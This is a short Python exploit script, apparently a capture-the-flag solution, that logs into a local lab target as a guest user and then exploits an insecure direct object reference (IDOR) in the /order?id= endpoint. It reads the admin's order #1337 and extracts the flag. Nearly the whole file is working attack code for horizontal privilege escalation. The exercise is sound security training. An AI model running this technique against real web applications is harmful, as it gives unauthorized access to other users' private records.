#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
30-idor-order-horizontal  -  IDOR 水平越权一键拿 flag
靶机: http://127.0.0.1:34938
凭据: guest / guest123（登录表单 placeholder 已经写好）
漏洞: /order?id=<n>  详情接口未校验订单 owner，可越权读 admin 的 #1337
"""
import re
import sys
import requests

BASE = os.environ.get("GKD_URL") or ("http://127.0.0.1:34938")
USER, PWD = "guest", "guest123"
ADMIN_ORDER_ID = 1337


def main():
    s = requests.Session()

    # Step 1: 登录拿到 PHPSESSID
    r = s.post(f"{BASE}/login",
               data={"username": USER, "password": PWD},
               allow_redirects=False, timeout=10)
    assert r.status_code in (301, 302), f"登录失败: {r.status_code}\n{r.text}"
    print(f"[+] 登录成功, PHPSESSID={s.cookies.get('PHPSESSID')}")

    # Step 2: 看一眼自己的订单（可选，仅用于演示）
    home = s.get(f"{BASE}/", timeout=10).text
    my_ids = re.findall(r"#(\d+)", home)
    print(f"[+] 我的订单列表: {my_ids}  (列表页过滤了, 详情页没过滤)")

    # Step 3: 水平越权——直接请求 admin 的订单 id=1337
    r = s.get(f"{BASE}/order", params={"id": ADMIN_ORDER_ID}, timeout=10)
    print(f"[+] /order?id={ADMIN_ORDER_ID} -> {r.status_code}")
    print(r.text)

    # Step 4: 抠出 flag
    m = re.search(r"TOGOGO-flag\{[^}]+\}", r.text)
    if not m:
        print("[-] 未匹配到 flag", file=sys.stderr)
        sys.exit(1)
    print(f"\n[★] FLAG = {m.group(0)}")


if __name__ == "__main__":
    main()
